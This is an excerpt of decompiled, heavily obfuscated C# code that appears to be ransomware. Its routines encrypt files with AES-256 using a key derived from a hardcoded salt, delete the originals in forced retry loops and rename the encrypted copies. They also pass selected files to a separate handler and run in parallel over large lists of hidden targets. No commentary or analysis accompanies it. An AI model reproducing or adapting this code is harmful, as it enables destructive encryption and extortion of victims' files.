												fSyEEKEvmFT.dOvkKfZERAIf(PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl.getString_0(107393994), PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl.getString_0(107393989), PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl.getString_0(107394008), CS_0024_003C_003E8__locals0.qovmJnexGQHr);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.qovmJnexGQHr.ToLower().EndsWith(item3) && PCTnOOIsiyb == PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl.getString_0(107396267))
									{
										try
										{
											fSyEEKEvmFT.dOvkKfZERAIf(PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl.getString_0(107393994), PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl.getString_0(107393989), PXwRYXTOzmdXR.ayxsjdGAqFgNsZPl.getString_0(107394008), CS_0024_003C_003E8__locals0.qovmJnexGQHr);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = aoktqsPyKNrT.bQYenalhegZpc(32);
						string s = KFckqrNJGkCunhP.SqbbFIeFDghCLc(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = HUMYHcgEnuXOnA.SAmmtsGWAzQW(CS_0024_003C_003E8__locals0.qovmJnexGQHr, Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024);
						HUMYHcgEnuXOnA.zrGRplxDVNnVZ(qYKKNYYyDxc: (!EgxLiKEDXzXg) ? (dTyBwXiyZmm ? HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.aldVhKQaAlMhN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dTyBwXiyZmm ? gtaxXmzNukhl.IRClroQZINdrf(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gtaxXmzNukhl.IRClroQZINdrf(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.aldVhKQaAlMhN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), qGxsFVvELQptUE: CS_0024_003C_003E8__locals0.qovmJnexGQHr, lzOOtsdFUZeYWVN: bytes);
					}
					else
					{
						string text2 = aoktqsPyKNrT.bQYenalhegZpc(32);
						string s2 = KFckqrNJGkCunhP.SqbbFIeFDghCLc(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO != PXwRYXTOzmdXR.getString_0(107390011))
						{
							if (!IiEkQrvmRIR)
							{
								if (!dTyBwXiyZmm)
								{
									jBEvNeuZST(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, hEBhhxLGASeyx);
								}
								else
								{
									jBEvNeuZST(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!dTyBwXiyZmm)
									{
										SQUjNlFwpPPbBg(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, hEBhhxLGASeyx);
									}
									else
									{
										SQUjNlFwpPPbBg(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (CWJvOLeqgyddlcWAG)
									{
										try
										{
											File.AppendAllText(CaiUUOOprZSOI, PXwRYXTOzmdXR.getString_0(107389778) + CS_0024_003C_003E8__locals0.qovmJnexGQHr + PXwRYXTOzmdXR.getString_0(107390029) + ex6.Message + PXwRYXTOzmdXR.getString_0(107396689));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!IiEkQrvmRIR)
						{
							if (!dTyBwXiyZmm)
							{
								jBEvNeuZST(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + PXwRYXTOzmdXR.getString_0(107390038), hEBhhxLGASeyx);
							}
							else
							{
								jBEvNeuZST(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + PXwRYXTOzmdXR.getString_0(107390038), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!dTyBwXiyZmm)
								{
									SQUjNlFwpPPbBg(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr, hEBhhxLGASeyx);
								}
								else
								{
									SQUjNlFwpPPbBg(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (CWJvOLeqgyddlcWAG)
								{
									try
									{
										File.AppendAllText(CaiUUOOprZSOI, PXwRYXTOzmdXR.getString_0(107389778) + CS_0024_003C_003E8__locals0.qovmJnexGQHr + PXwRYXTOzmdXR.getString_0(107390029) + ex8.Message + PXwRYXTOzmdXR.getString_0(107396689));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (dTyBwXiyZmm)
						{
							if (CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO != PXwRYXTOzmdXR.getString_0(107390011))
							{
								sDwSpKRRMNhM(CS_0024_003C_003E8__locals0.qovmJnexGQHr + CS_0024_003C_003E8__locals0.SYtBaLuBfRpuAO, bytes2);
							}
							else
							{
								sDwSpKRRMNhM(CS_0024_003C_003E8__locals0.qovmJnexGQHr, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			CS_0024_003C_003E8__locals0.XGytlEcpSakio.Remove(CS_0024_003C_003E8__locals0.qovmJnexGQHr);
		});
	}

	private static void vhgvqczCswCXHD(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (JdQhqbSZaoMfQdp == getString_0(107396787))
					{
						foreach (string item in nSXBpdGwvrZMVvqT)
						{
							if (string_0.ToLower().EndsWith(item) && PCTnOOIsiyb == getString_0(107396787))
							{
								if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393971), getString_0(107393966), getString_0(107393985), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && PCTnOOIsiyb == getString_0(107396244))
							{
								try
								{
									fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393971), getString_0(107393966), getString_0(107393985), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107390021)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107390021), getString_0(107393922)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void SQUjNlFwpPPbBg(string string_0, string string_1, byte[] byte_0)
	{
		if (JdQhqbSZaoMfQdp == getString_0(107396787))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in nSXBpdGwvrZMVvqT)
			{
				if (string_0.ToLower().EndsWith(item) && PCTnOOIsiyb == getString_0(107396787))
				{
					if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393971), getString_0(107393966), getString_0(107393985), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && PCTnOOIsiyb == getString_0(107396244))
				{
					try
					{
						fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393971), getString_0(107393966), getString_0(107393985), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = gtaxXmzNukhl.IRClroQZINdrf(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
		}
	}

	private static void jBEvNeuZST(string string_0, string string_1, byte[] byte_0)
	{
		JyWXxUVrotkghn CS_0024_003C_003E8__locals0 = new JyWXxUVrotkghn();
		CS_0024_003C_003E8__locals0.VhGsAMJbeWAG = string_0;
		CS_0024_003C_003E8__locals0.kAYiKySXNKzr = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string kAYiKySXNKzr = CS_0024_003C_003E8__locals0.kAYiKySXNKzr;
			FileStream fileStream = new FileStream(kAYiKySXNKzr, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (mANJAWVWINnm == getString_0(107396787))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.VhGsAMJbeWAG, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.VhGsAMJbeWAG, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.VhGsAMJbeWAG, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.kAYiKySXNKzr.Length > 0)
				{
					if (JdQhqbSZaoMfQdp == getString_0(107396787))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.VhGsAMJbeWAG, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in nSXBpdGwvrZMVvqT)
						{
							if (CS_0024_003C_003E8__locals0.VhGsAMJbeWAG.ToLower().EndsWith(item) && PCTnOOIsiyb == getString_0(107396787))
							{
								if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393971), getString_0(107393966), getString_0(107393985), CS_0024_003C_003E8__locals0.VhGsAMJbeWAG);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.VhGsAMJbeWAG.ToLower().EndsWith(item) && PCTnOOIsiyb == getString_0(107396244))
							{
								try
								{
									fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393971), getString_0(107393966), getString_0(107393985), CS_0024_003C_003E8__locals0.VhGsAMJbeWAG);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.VhGsAMJbeWAG);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.kAYiKySXNKzr.EndsWith(getString_0(107390021)))
					{
						File.Move(CS_0024_003C_003E8__locals0.kAYiKySXNKzr, CS_0024_003C_003E8__locals0.kAYiKySXNKzr.Replace(getString_0(107390021), getString_0(107393922)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.kAYiKySXNKzr))
							{
								File.Delete(CS_0024_003C_003E8__locals0.kAYiKySXNKzr);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (CWJvOLeqgyddlcWAG)
			{
				try
				{
					File.AppendAllText(CaiUUOOprZSOI, getString_0(107389761) + CS_0024_003C_003E8__locals0.VhGsAMJbeWAG + getString_0(107390012) + ex2.Message + getString_0(107396672));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = rTdBGDqcIJimSxIX;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				tNIQYAGwSjGxNLsorK(getString_0(107389959), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> keEYwzsaSxlMyF = KeEYwzsaSxlMyF;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				tNIQYAGwSjGxNLsorK(getString_0(107393039), string_0);
			};
		}
		Parallel.ForEach(keEYwzsaSxlMyF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		List<string> mSUPRnrxQZS = MSUPRnrxQZS;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389950)), string_0);
			};
		}
		Parallel.ForEach(mSUPRnrxQZS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		if (NeuNfTmbHfaft == getString_0(107396787))
		{
			string[] msFMIZIkwWWDM = MsFMIZIkwWWDM;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389950)), getString_0(107389925) + string_0 + getString_0(107389916));
				};
			}
			Parallel.ForEach(msFMIZIkwWWDM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		if (!joaHINJofMtf().Contains(getString_0(107389627)))
		{
			wdbDsjzTMTZdknmj(IquwDHMWXJfl);
		}
		else
		{
			List<string> aaZWCpttHpB = AaZWCpttHpB;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(GWbGalFEHz(getString_0(107389879))), string_0);
				};
			}
			Parallel.ForEach(aaZWCpttHpB, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		List<string> source2 = vtEaPMjBqiI;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389886)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		List<string> source3 = fguLtySThkLVUO;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				tNIQYAGwSjGxNLsorK(getString_0(107389837), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		tNIQYAGwSjGxNLsorK(getString_0(107389959), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		tNIQYAGwSjGxNLsorK(getString_0(107393039), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389950)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389950)), getString_0(107389925) + string_0 + getString_0(107389916));
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(GWbGalFEHz(getString_0(107389879))), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		tNIQYAGwSjGxNLsorK(sZXTHnjVRHJHh(getString_0(107389886)), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		tNIQYAGwSjGxNLsorK(getString_0(107389837), string_0);
	}

	static PYtJscelCaHU()
	{
		Strings.CreateGetStringDelegate(typeof(PYtJscelCaHU));
		pjbuqjEcISLbaVHe = getString_0(107393322);
		hEBhhxLGASeyx = null;
		DcddTdPcfuJ = getString_0(107396244);
		LIIoXHybcY = getString_0(107389860);
		NHjEeCAIyKCHA = new List<string>();
		HAsMoHlRHhVzwI = new List<string>();
		qlrIuPADfJmNXN = getString_0(107396244);
		aldVhKQaAlMhN = getString_0(107393922);
		VuGCfwhZpvjG = getString_0(107393922);
		UciAonDnDgG = getString_0(107396244);
		uuEPphXmHlJGCzJ = 0;
		nFUAVKfCtKjV = getString_0(107396244);
		wCHkzTdtpItw = getString_0(107396244);
		hMsIWlRzYTbzz = getString_0(107396244);
		gIIaFOGxgjhbOPbd = getString_0(107389815);
		eStZUoAxoq = getString_0(107396787);
		PRLseytRJqsOWU = getString_0(107396244);
		hsEzAQuJXtzCY = getString_0(107396244);
		lITzVnlWBJ = getString_0(107396244);
		KUEQBNlZlAJotIdmaQ = new List<string>
		{
			sZXTHnjVRHJHh(getString_0(107389810)),
			sZXTHnjVRHJHh(getString_0(107389825)),
			sZXTHnjVRHJHh(getString_0(107389288)),
			sZXTHnjVRHJHh(getString_0(107389239)),
			sZXTHnjVRHJHh(getString_0(107389246)),
			sZXTHnjVRHJHh(getString_0(107389221)),
			sZXTHnjVRHJHh(getString_0(107389172)),
			sZXTHnjVRHJHh(getString_0(107389179)),
			sZXTHnjVRHJHh(getString_0(107389154)),
			sZXTHnjVRHJHh(getString_0(107389097)),
			sZXTHnjVRHJHh(getString_0(107389080)),
			sZXTHnjVRHJHh(getString_0(107389087)),
			sZXTHnjVRHJHh(getString_0(107389062))
		};
		EmJIhpwRkVaJOMp = new List<string>();
		QeXXVVSolOUXg = getString_0(107396787);
		aNkRJHChYmlmHoVd = getString_0(107396244);
		WLYQHdgcRWyAk = getString_0(107396244);
		yDDNFePBurFmPAas = new List<string>();
		GcWglZgKFxR = getString_0(107396244);
		doRadQRQDdrKKc = getString_0(107389517);
		JVeOnCXrBINQO = getString_0(107396244);
		EpNlyaldrfMUUp = getString_0(107396244);
		KeEYwzsaSxlMyF = new List<string>
		{
			sZXTHnjVRHJHh(getString_0(107389500)),
			sZXTHnjVRHJHh(getString_0(107389467)),
			sZXTHnjVRHJHh(getString_0(107389434)),
			sZXTHnjVRHJHh(getString_0(107389401)),
			sZXTHnjVRHJHh(getString_0(107389336)),
			sZXTHnjVRHJHh(getString_0(107389339)),
			sZXTHnjVRHJHh(getString_0(107388770)),
			sZXTHnjVRHJHh(getString_0(107388741)),
			sZXTHnjVRHJHh(getString_0(107388664)),
			sZXTHnjVRHJHh(getString_0(107388599)),
			sZXTHnjVRHJHh(getString_0(107388566)),
			sZXTHnjVRHJHh(getString_0(107388533)),
			sZXTHnjVRHJHh(getString_0(107389012)),
			sZXTHnjVRHJHh(getString_0(107388983)),
			sZXTHnjVRHJHh(getString_0(107388986)),
			sZXTHnjVRHJHh(getString_0(107388913)),
			sZXTHnjVRHJHh(getString_0(107388904)),
			sZXTHnjVRHJHh(getString_0(107388815)),
			sZXTHnjVRHJHh(getString_0(107388798)),
			sZXTHnjVRHJHh(getString_0(107388253)),
			sZXTHnjVRHJHh(getString_0(107388224)),
			sZXTHnjVRHJHh(getString_0(107388151)),
			sZXTHnjVRHJHh(getString_0(107388110)),
			sZXTHnjVRHJHh(getString_0(107388077)),
			sZXTHnjVRHJHh(getString_0(107388060)),
			sZXTHnjVRHJHh(getString_0(107388515)),
			sZXTHnjVRHJHh(getString_0(107388474)),
			sZXTHnjVRHJHh(getString_0(107388445)),
			sZXTHnjVRHJHh(getString_0(107388372)),
			sZXTHnjVRHJHh(getString_0(107388347)),
			sZXTHnjVRHJHh(getString_0(107388282)),
			sZXTHnjVRHJHh(getString_0(107387713)),
			sZXTHnjVRHJHh(getString_0(107387648)),
			sZXTHnjVRHJHh(getString_0(107387567)),
			sZXTHnjVRHJHh(getString_0(107387502)),
			sZXTHnjVRHJHh(getString_0(107387957)),
			sZXTHnjVRHJHh(getString_0(107387924)),
			sZXTHnjVRHJHh(getString_0(107387883)),
			sZXTHnjVRHJHh(getString_0(107387874)),
			sZXTHnjVRHJHh(getString_0(107387797)),
			sZXTHnjVRHJHh(getString_0(107387768)),
			sZXTHnjVRHJHh(getString_0(107387191)),
			sZXTHnjVRHJHh(getString_0(107387150)),
			sZXTHnjVRHJHh(getString_0(107387117)),
			sZXTHnjVRHJHh(getString_0(107387108)),
			sZXTHnjVRHJHh(getString_0(107387027)),
			sZXTHnjVRHJHh(getString_0(107387014)),
			sZXTHnjVRHJHh(getString_0(107387453)),
			sZXTHnjVRHJHh(getString_0(107387376)),
			sZXTHnjVRHJHh(getString_0(107387363)),
			sZXTHnjVRHJHh(getString_0(107387286)),
			sZXTHnjVRHJHh(getString_0(107387245)),
			sZXTHnjVRHJHh(getString_0(107386692)),
			sZXTHnjVRHJHh(getString_0(107386663)),
			sZXTHnjVRHJHh(getString_0(107386622)),
			sZXTHnjVRHJHh(getString_0(107386557)),
			sZXTHnjVRHJHh(getString_0(107386480)),
			sZXTHnjVRHJHh(getString_0(107386963)),
			sZXTHnjVRHJHh(getString_0(107386950)),
			sZXTHnjVRHJHh(getString_0(107386885)),
			sZXTHnjVRHJHh(getString_0(107386856)),
			sZXTHnjVRHJHh(getString_0(107386767)),
			sZXTHnjVRHJHh(getString_0(107386190)),
			sZXTHnjVRHJHh(getString_0(107386181)),
			sZXTHnjVRHJHh(getString_0(107386152)),
			sZXTHnjVRHJHh(getString_0(107386111)),
			sZXTHnjVRHJHh(getString_0(107385998)),
			sZXTHnjVRHJHh(getString_0(107386449)),
			sZXTHnjVRHJHh(getString_0(107386408)),
			sZXTHnjVRHJHh(getString_0(107386363)),
			sZXTHnjVRHJHh(getString_0(107386330)),
			sZXTHnjVRHJHh(getString_0(107386257)),
			sZXTHnjVRHJHh(getString_0(107385700)),
			sZXTHnjVRHJHh(getString_0(107385623)),
			sZXTHnjVRHJHh(getString_0(107385566)),
			sZXTHnjVRHJHh(getString_0(107385485)),
			sZXTHnjVRHJHh(getString_0(107385456)),
			sZXTHnjVRHJHh(getString_0(107385959)),
			sZXTHnjVRHJHh(getString_0(107385894)),
			sZXTHnjVRHJHh(getString_0(107385813)),
			sZXTHnjVRHJHh(getString_0(107385788)),
			sZXTHnjVRHJHh(getString_0(107385755)),
			sZXTHnjVRHJHh(getString_0(107385182)),
			sZXTHnjVRHJHh(getString_0(107385125)),
			sZXTHnjVRHJHh(getString_0(107387957)),
			sZXTHnjVRHJHh(getString_0(107385036)),
			sZXTHnjVRHJHh(getString_0(107385027)),
			sZXTHnjVRHJHh(getString_0(107385418)),
			sZXTHnjVRHJHh(getString_0(107385405)),
			sZXTHnjVRHJHh(getString_0(107385344)),
			sZXTHnjVRHJHh(getString_0(107385319)),
			sZXTHnjVRHJHh(getString_0(107385274)),
			sZXTHnjVRHJHh(getString_0(107385193)),
			sZXTHnjVRHJHh(getString_0(107388347)),
			sZXTHnjVRHJHh(getString_0(107384648)),
			sZXTHnjVRHJHh(getString_0(107384607)),
			sZXTHnjVRHJHh(getString_0(107384550)),
			sZXTHnjVRHJHh(getString_0(107388282)),
			sZXTHnjVRHJHh(getString_0(107384477)),
			sZXTHnjVRHJHh(getString_0(107384908)),
			sZXTHnjVRHJHh(getString_0(107384819)),
			sZXTHnjVRHJHh(getString_0(107384754)),
			sZXTHnjVRHJHh(getString_0(107384737)),
			sZXTHnjVRHJHh(getString_0(107387648)),
			sZXTHnjVRHJHh(getString_0(107384116)),
			sZXTHnjVRHJHh(getString_0(107387924)),
			sZXTHnjVRHJHh(getString_0(107387567)),
			sZXTHnjVRHJHh(getString_0(107384083)),
			sZXTHnjVRHJHh(getString_0(107384058)),
			sZXTHnjVRHJHh(getString_0(107387502)),
			sZXTHnjVRHJHh(getString_0(107384025)),
			sZXTHnjVRHJHh(getString_0(107383976)),
			sZXTHnjVRHJHh(getString_0(107384407)),
			sZXTHnjVRHJHh(getString_0(107388372)),
			sZXTHnjVRHJHh(getString_0(107384414)),
			sZXTHnjVRHJHh(getString_0(107384337)),
			sZXTHnjVRHJHh(getString_0(107384308)),
			sZXTHnjVRHJHh(getString_0(107384279)),
			sZXTHnjVRHJHh(getString_0(107384234)),
			sZXTHnjVRHJHh(getString_0(107384201)),
			sZXTHnjVRHJHh(getString_0(107384176)),
			sZXTHnjVRHJHh(getString_0(107383651)),
			sZXTHnjVRHJHh(getString_0(107383594)),
			sZXTHnjVRHJHh(getString_0(107383585)),
			sZXTHnjVRHJHh(getString_0(107383508)),
			sZXTHnjVRHJHh(getString_0(107383491)),
			sZXTHnjVRHJHh(getString_0(107383402)),
			sZXTHnjVRHJHh(getString_0(107383881)),
			sZXTHnjVRHJHh(getString_0(107383868)),
			sZXTHnjVRHJHh(getString_0(107383835)),
			sZXTHnjVRHJHh(getString_0(107383762)),
			sZXTHnjVRHJHh(getString_0(107388445)),
			sZXTHnjVRHJHh(getString_0(107383491)),
			sZXTHnjVRHJHh(getString_0(107383721)),
			sZXTHnjVRHJHh(getString_0(107383692)),
			sZXTHnjVRHJHh(getString_0(107383663)),
			sZXTHnjVRHJHh(getString_0(107383134)),
			sZXTHnjVRHJHh(getString_0(107383061)),
			sZXTHnjVRHJHh(getString_0(107383000)),
			sZXTHnjVRHJHh(getString_0(107382927)),
			sZXTHnjVRHJHh(getString_0(107382898)),
			sZXTHnjVRHJHh(getString_0(107383377)),
			sZXTHnjVRHJHh(getString_0(107383336)),
			sZXTHnjVRHJHh(getString_0(107383275)),
			sZXTHnjVRHJHh(getString_0(107383262)),
			sZXTHnjVRHJHh(getString_0(107383197)),
			sZXTHnjVRHJHh(getString_0(107383164)),
			sZXTHnjVRHJHh(getString_0(107382575)),
			sZXTHnjVRHJHh(getString_0(107382514)),
			sZXTHnjVRHJHh(getString_0(107382481)),
			sZXTHnjVRHJHh(getString_0(107382468)),
			sZXTHnjVRHJHh(getString_0(107382403)),
			sZXTHnjVRHJHh(getString_0(107382882)),
			sZXTHnjVRHJHh(getString_0(107382841)),
			sZXTHnjVRHJHh(getString_0(107382792)),
